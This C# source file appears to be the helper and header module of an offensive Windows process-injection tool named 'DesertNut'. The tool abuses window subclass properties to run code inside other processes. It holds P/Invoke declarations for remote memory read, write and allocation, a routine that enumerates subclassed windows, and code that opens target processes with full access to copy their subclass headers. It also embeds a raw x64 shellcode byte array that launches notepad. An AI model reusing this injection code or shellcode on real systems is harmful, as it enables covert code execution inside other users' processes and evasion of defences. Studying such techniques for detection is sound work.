using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Colorful;
using Console = Colorful.Console;
using System.Drawing;

namespace DesertNut
{
    class DesertNut_h
    {
        // Banner
        //-----------------------------------
        public static void PrintBanner()
        {
            Console.ForegroundColor = Color.Orange;
            Console.WriteLine("           ,                        '           .        '        ,        ");
            Console.WriteLine("   .            .        '       .         ,                               ");
            Console.WriteLine("                                                   .       '     +         ");
            Console.WriteLine("       +          .-'''''-.                                                ");
            Console.WriteLine("                .'         `.   +     .     ________||                     ");
            Console.WriteLine("       ___     :             :     |       /        ||  .     '___         ");
            Console.WriteLine("  ____/   \\   :               :   ||.    _/      || ||\\_______/   \\     ");
            Console.WriteLine(" /         \\  :      _/|      :   `|| __/      ,.|| ||             \\     ");
            Console.WriteLine("/  ,   '  . \\  :   =/_/      :     |'_______     || ||  ||   .      \\    ");
            Console.WriteLine("    |        \\__`._/ |     .'   ___|        \\__   \\\\||  ||...    ,   \\");
            Console.WriteLine("   l|,   '   (   /  ,|...-'        \\   '   ,     __\\||_//___             ");
            Console.WriteLine(" ___|____     \\_/^\\/||__    ,    .  ,__             ||//    \\    .  ,   ");
            Console.WriteLine("           _/~  `''~`'` \\_           ''(       ....,||/       '           ");
            Console.WriteLine(" ..,...  __/  -'/  `-._ `\\_\\__        | \\           ||  _______   .     ");
            Console.WriteLine("              '`  `\\   \\  \\-.\\        /(_1_,..      || /               ");
            Console.WriteLine("                                            ______/''''                  \n");
            Console.ResetColor();
        }

        // Globals
        //-----------------------------------
        public static List<WndPropStruc> SubclassWndProps = new List<WndPropStruc>();
        public static WndPropStruc TargetSubclass = new WndPropStruc();
        public static Formatter[] sProperties =
        {
            new Formatter("[>]", Color.LightGreen),
            new Formatter(":", Color.LightGreen),
            new Formatter("|->", Color.LightGreen),
            new Formatter(",", Color.LightGreen),
            new Formatter("PID", Color.Orange),
            new Formatter("ImageName", Color.Orange),
            new Formatter("hProperty", Color.Orange),
            new Formatter("hParentWnd", Color.Orange),
            new Formatter("hChildWnd", Color.Orange),
            new Formatter("ParentClassName", Color.Orange),
            new Formatter("ChildClassName", Color.Orange),
        };
        public static Formatter[] iProperties =
        {
            new Formatter("[>]", Color.LightGreen),
            new Formatter(":", Color.LightGreen),
            new Formatter("|->", Color.LightGreen),
            new Formatter(",", Color.LightGreen),
            new Formatter("-->", Color.LightGreen),
            new Formatter("hProc", Color.Orange),
            new Formatter("hProperty", Color.Orange),
            new Formatter("uRefs", Color.Orange),
            new Formatter("uAlloc", Color.Orange),
            new Formatter("uCleanup", Color.Orange),
            new Formatter("dwThreadId", Color.Orange),
            new Formatter("pFrameCur", Color.Orange),
            new Formatter("pfnSubclass", Color.Orange),
            new Formatter("uIdSubclass", Color.Orange),
            new Formatter("dwRefData", Color.Orange),
            new Formatter("Sc Len", Color.Orange),
            new Formatter("Sc Address", Color.Orange),
            new Formatter("Subclass header Len", Color.Orange),
            new Formatter("Subclass header Address", Color.Orange),
        };

        // Structs
        //-----------------------------------
        [StructLayout(LayoutKind.Sequential)]
        public struct WndPropStruc
        {
            public UInt32 dwPid;
            public String ImageName;
            public IntPtr hProperty;
            public IntPtr hParentWnd;
            public IntPtr hChildWnd;
            public String ParentClassName;
            public String ChildClassName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SUBCLASS_HEADER
        {
            public UInt32 uRefs;
            public UInt32 uAlloc;
            public UInt32 uCleanup;
            public UInt32 dwThreadId;
            public IntPtr pFrameCur;
            public SUBCLASS_CALL CallArray;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SUBCLASS_FRAME
        {
            public UInt32 uCallIndex;
            public UInt32 uDeepestCall;
            public IntPtr pFramePrev;
            public IntPtr pHeader;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SUBCLASS_CALL
        {
            public IntPtr pfnSubclass;
            public UIntPtr uIdSubclass;
            public UIntPtr dwRefData;
        }

        // APIs
        //-----------------------------------
        [DllImport("user32.dll")]
        public static extern bool EnumWindows(
            WindowCallBack callback, 
            int lParam);

        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(
            IntPtr window, 
            WindowCallBack callback, 
            IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern int EnumProps(
            IntPtr hwnd, 
            PropEnumPropCallBack lpEnumFunc);

        [DllImport("user32.dll")]
        public static extern IntPtr GetProp(
            IntPtr hWnd, 
            String lpString);

        [DllImport("user32.dll")]
        public static extern bool SetProp(
            IntPtr hWnd, 
            string lpString, 
            IntPtr hData);

        [DllImport("user32.dll")]
        public static extern bool PostMessage(
            IntPtr hWnd, 
            uint Msg, 
            IntPtr wParam, 
            IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(
            IntPtr hWnd, 
            ref UInt32 ProcessId);

        [DllImport("user32.dll")]
        public static extern IntPtr GetParent(
            IntPtr hWnd);

        [DllImport("user32.dll")]
        public static extern int GetClassName(
            IntPtr hWnd, 
            StringBuilder lpClassName, 
            int nMaxCount);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(
            UInt32 processAccess, 
            bool bInheritHandle, 
            int processId);

        [DllImport("kernel32.dll")]
        public static extern Boolean ReadProcessMemory(
            IntPtr hProcess, 
            IntPtr lpBaseAddress, 
            IntPtr lpBuffer, 
            UInt32 dwSize, 
            ref UInt32 lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            ref UInt32 lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            int flAllocationType,
            int flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            UInt32 dwSize,
            UInt32 dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern Boolean CloseHandle(
            IntPtr hObject);

        // Callbacks
        //-----------------------------------
        public delegate bool WindowCallBack(IntPtr hwnd, IntPtr lParam);
        public delegate bool PropEnumPropCallBack(IntPtr hwnd, IntPtr lpszString, IntPtr hData);

        // Shellcode
        // Function prototype should be:
        // typedef LRESULT (CALLBACK *SUBCLASSPROC)(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData);
        // ==> https://github.com/odzhan/injection/blob/master/payload/x64/payload.c
        // Below was compiled for x64 only!
        //-----------------------------------
        public static byte[] NotepadSc = new byte[344]
        {
            0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x48, 0xD8, 0xC7, 0x40, 0xD8, 0x57, 0x69,
            0x6E, 0x45, 0xC7, 0x40, 0xDC, 0x78, 0x65, 0x63, 0x00, 0xC7, 0x40, 0xE0, 0x6E, 0x6F, 0x74, 0x65,
            0xC7, 0x40, 0xE4, 0x70, 0x61, 0x64, 0x00, 0xE8, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
            0x0C, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x33, 0xC0, 0x48,
            0x83, 0xC4, 0x48, 0xC3, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
            0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC,
            0x20, 0x48, 0x63, 0x41, 0x3C, 0x48, 0x8B, 0xD9, 0x4C, 0x8B, 0xE2, 0x8B, 0x8C, 0x08, 0x88, 0x00,
            0x00, 0x00, 0x85, 0xC9, 0x74, 0x37, 0x48, 0x8D, 0x04, 0x0B, 0x8B, 0x78, 0x18, 0x85, 0xFF, 0x74,
            0x2C, 0x8B, 0x70, 0x1C, 0x44, 0x8B, 0x70, 0x20, 0x48, 0x03, 0xF3, 0x8B, 0x68, 0x24, 0x4C, 0x03,
            0xF3, 0x48, 0x03, 0xEB, 0xFF, 0xCF, 0x49, 0x8B, 0xCC, 0x41, 0x8B, 0x14, 0xBE, 0x48, 0x03, 0xD3,
            0xE8, 0x87, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x25, 0x85, 0xFF, 0x75, 0xE7, 0x33, 0xC0, 0x48,
            0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48, 0x8B,
            0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0xC3, 0x0F, 0xB7,
            0x44, 0x7D, 0x00, 0x8B, 0x04, 0x86, 0x48, 0x03, 0xC3, 0xEB, 0xD4, 0xCC, 0x48, 0x89, 0x5C, 0x24,
            0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
            0x8B, 0xF9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x50, 0x18, 0x48, 0x8B, 0x5A, 0x10, 0xEB, 0x16, 0x4D,
            0x85, 0xC0, 0x75, 0x1A, 0x48, 0x8B, 0xD7, 0x48, 0x8B, 0xC8, 0xE8, 0x35, 0xFF, 0xFF, 0xFF, 0x48,
            0x8B, 0x1B, 0x4C, 0x8B, 0xC0, 0x48, 0x8B, 0x43, 0x30, 0x48, 0x85, 0xC0, 0x75, 0xE1, 0x48, 0x8B,
            0x5C, 0x24, 0x30, 0x49, 0x8B, 0xC0, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x44, 0x8A, 0x01, 0x45,
            0x84, 0xC0, 0x74, 0x1A, 0x41, 0x8A, 0xC0, 0x48, 0x2B, 0xCA, 0x44, 0x8A, 0xC0, 0x3A, 0x02, 0x75,
            0x0D, 0x48, 0xFF, 0xC2, 0x8A, 0x04, 0x11, 0x44, 0x8A, 0xC0, 0x84, 0xC0, 0x75, 0xEC, 0x0F, 0xB6,
            0x0A, 0x41, 0x0F, 0xB6, 0xC0, 0x2B, 0xC1, 0xC3
        };

        // Helpers
        //-----------------------------------
        public static Boolean EnumWndProps(IntPtr hwnd, IntPtr lpszString, IntPtr hData)
        {
            // Create result struct
            WndPropStruc PropertyStruct = new WndPropStruc();
            // Fill struct data
            IntPtr UxSubclass = GetProp(hwnd, "UxSubclassInfo");
            IntPtr CC32Subclass = GetProp(hwnd, "CC32SubclassInfo");
            if (UxSubclass == IntPtr.Zero && CC32Subclass == IntPtr.Zero)
            {
                // This doesn't have what we need..
            } else
            {
                // Parse data
                if (UxSubclass == IntPtr.Zero)
                {
                    PropertyStruct.hProperty = CC32Subclass;
                }
                else
                {
                    PropertyStruct.hProperty = UxSubclass;
                }
                PropertyStruct.hChildWnd = hwnd;
                PropertyStruct.hParentWnd = GetParent(hwnd);
                GetWindowThreadProcessId(hwnd, ref PropertyStruct.dwPid);
                StringBuilder ParentClassName = new StringBuilder(260);
                GetClassName(PropertyStruct.hParentWnd, ParentClassName, 260);
                PropertyStruct.ParentClassName = ParentClassName.ToString();
                StringBuilder ChildClassName = new StringBuilder(260);
                GetClassName(PropertyStruct.hChildWnd, ChildClassName, 260);
                PropertyStruct.ChildClassName = ChildClassName.ToString();
                PropertyStruct.ImageName = Process.GetProcessById((int)PropertyStruct.dwPid).ProcessName;

                // if unique add to list
                if (!SubclassWndProps.Any(Entry => Entry.hProperty == PropertyStruct.hProperty))
                {
                    SubclassWndProps.Add(PropertyStruct);
                }
            }

            return true;
        }

        public static Boolean EnumChildWnd(IntPtr hwnd, IntPtr lParam)
        {
            EnumProps(hwnd, new PropEnumPropCallBack(EnumWndProps));
            return true;
        }

        public static Boolean EnumWnd(IntPtr hwnd, IntPtr lParam)
        {
            EnumChildWindows(hwnd, new WindowCallBack(EnumChildWnd), (IntPtr)0);
            EnumProps(hwnd, new PropEnumPropCallBack(EnumWndProps));
            return true;
        }

        public static List<WndPropStruc> EnumSubClassProps(Boolean List)
        {
            EnumWindows(new WindowCallBack(EnumWnd), 0);
            if (SubclassWndProps.Count > 0)
            {
                if (List)
                {
                    Console.WriteLine("\n[+] Subclassed Window Properties", Color.LightGreen);
                    foreach (WndPropStruc SubClass in SubclassWndProps)
                    {
                        Console.WriteLineFormatted("{0} {4}{1} " + SubClass.dwPid + "{3} {5}{1} " + SubClass.ImageName, Color.White, sProperties);
                        Console.WriteLineFormatted("    {2} {6}{1} " + "0x" + String.Format("{0:X}", (SubClass.hProperty).ToInt64()) + "{3} {7}{1} " + "0x" + String.Format("{0:X}", (SubClass.hParentWnd).ToInt64()) + "{3} {8}{1} " + "0x" + String.Format("{0:X}", (SubClass.hChildWnd).ToInt64()), Color.White, sProperties);
                        Console.WriteLineFormatted("    {2} {9}{1} " + SubClass.ParentClassName + "{3} {10}{1} " + SubClass.ChildClassName + "\n", Color.White, sProperties);
                    }
                }
            }
            return SubclassWndProps;
        }

        public static IntPtr ReadSubclassHeader(WndPropStruc UxSubclassInfo)
        {
            // Open process
            Console.WriteLine("[+] Duplicating Subclass header..", Color.LightGreen);
            IntPtr hProc = OpenProcess(0x1F0FFF, false, (int)UxSubclassInfo.dwPid);
            if (hProc == IntPtr.Zero)
            {
                Console.WriteLine("[!] Unable to open " + UxSubclassInfo.ImageName + " for access.." , Color.Red);
                return IntPtr.Zero;
            } else
            {
                Console.WriteLineFormatted("{0} {5}{1} " + "0x" + String.Format("{0:X}", (hProc).ToInt64()), Color.White, iProperties);
            }

            // Read out header
            SUBCLASS_HEADER SubclassHeader = new SUBCLASS_HEADER();
            IntPtr HeaderCopy = Marshal.AllocHGlobal(Marshal.SizeOf(SubclassHeader));
            uint BytesRead = 0;
            Boolean CallResult = ReadProcessMemory(hProc, UxSubclassInfo.hProperty, HeaderCopy, (uint)(Marshal.SizeOf(SubclassHeader)), ref BytesRead);
            if (CallResult)
            {
                Console.WriteLineFormatted("{0} {6}{1} " + "0x" + String.Format("{0:X}", (UxSubclassInfo.hProperty).ToInt64()), Color.White, iProperties);
                SubclassHeader = (SUBCLASS_HEADER)Marshal.PtrToStructure(HeaderCopy, typeof(SUBCLASS_HEADER));
                Console.WriteLineFormatted("    {2} {7}{1} " + SubclassHeader.uRefs + "{3} {8}{1} " + SubclassHeader.uAlloc + "{3} {9}{1} " + SubclassHeader.uCleanup, Color.White, iProperties);
                Console.WriteLineFormatted("    {2} {10}{1} " + SubclassHeader.dwThreadId + "{3} {11}{1} " + SubclassHeader.pFrameCur, Color.White, iProperties);
                Console.WriteLineFormatted("    {2} {12}{1} " + "0x" + String.Format("{0:X}", (SubclassHeader.CallArray.pfnSubclass).ToInt64()) + " {4} comctl32!CallOriginalWndProc (?)", Color.White, iProperties);
                Console.WriteLineFormatted("    {2} {13}{1} " + SubclassHeader.CallArray.uIdSubclass + "{3} {14}{1} " + "0x" + String.Format("{0:X}", (Int64)SubclassHeader.CallArray.dwRefData), Color.White, iProperties);
            } else
            {
                Console.WriteLine("[!] Unable to call ReadProcessMemory..", Color.Red);
                CloseHandle(hProc);
                return IntPtr.Zero;
            }

            CloseHandle(hProc);
            return HeaderCopy;
        }
    }
}
